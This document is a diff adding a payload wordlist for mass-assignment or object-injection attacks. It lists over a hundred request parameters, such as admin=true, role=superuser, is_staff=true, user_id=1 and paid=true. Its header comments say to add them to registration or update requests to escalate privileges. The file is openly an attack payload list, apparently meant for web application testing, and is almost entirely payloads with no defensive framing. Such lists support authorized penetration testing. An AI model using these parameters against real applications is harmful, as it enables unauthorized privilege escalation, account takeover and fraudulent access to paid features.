@@ -1,0 +1,126 @@
+# Mass Assignment / Object Injection Parameters
+# Add these parameters to user registration/update requests to escalate privileges
+# Usage: Include in JSON body or form data
+
+# Admin/privilege flags
+admin=true
+admin=1
+isAdmin=true
+is_admin=true
+is_admin=1
+administrator=true
+isAdministrator=true
+
+# Role parameters
+role=admin
+role=administrator
+role=superuser
+role=root
+role=moderator
+role=staff
+user_role=admin
+userRole=admin
+accountRole=admin
+account_role=admin
+
+# Permission parameters
+privilege=admin
+privileges=["admin"]
+permissions=["all"]
+permissions=["read","write","delete","admin"]
+access_level=admin
+access_level=10
+accessLevel=admin
+level=admin
+level=0
+level=1
+
+# Account type parameters
+type=admin
+accountType=admin
+account_type=admin
+user_type=admin
+userType=admin
+plan=premium
+plan=enterprise
+tier=admin
+
+# Boolean flags
+verified=true
+is_verified=true
+active=true
+is_active=true
+approved=true
+is_approved=true
+enabled=true
+is_enabled=true
+confirmed=true
+email_verified=true
+
+# Superuser/staff flags
+superuser=true
+is_superuser=true
+super=true
+is_super=true
+staff=true
+is_staff=true
+internal=true
+is_internal=true
+
+# Moderator flags
+moderator=true
+is_moderator=true
+mod=true
+is_mod=true
+
+# Premium/VIP flags
+premium=true
+is_premium=true
+vip=true
+is_vip=true
+pro=true
+is_pro=true
+paid=true
+is_paid=true
+
+# Status parameters
+status=admin
+status=active
+status=approved
+state=active
+
+# ID manipulation (privilege escalation via user ID)
+id=1
+user_id=1
+userId=1
+uid=1
+account_id=1
+accountId=1
+owner_id=1
+ownerId=1
+
+# Group/organization
+group=admin
+group_id=1
+groupId=1
+org=admin
+organization=admin
+team=admin
+team_id=1
+teamId=1
+
+# Capability/feature flags
+can_delete=true
+can_edit=true
+can_manage=true
+can_admin=true
+has_admin_access=true
+elevated=true
+privileged=true
+trusted=true
+
+# API access
+api_access=true
+api_key_admin=true
+scope=admin
+scopes=["admin","write","delete"]
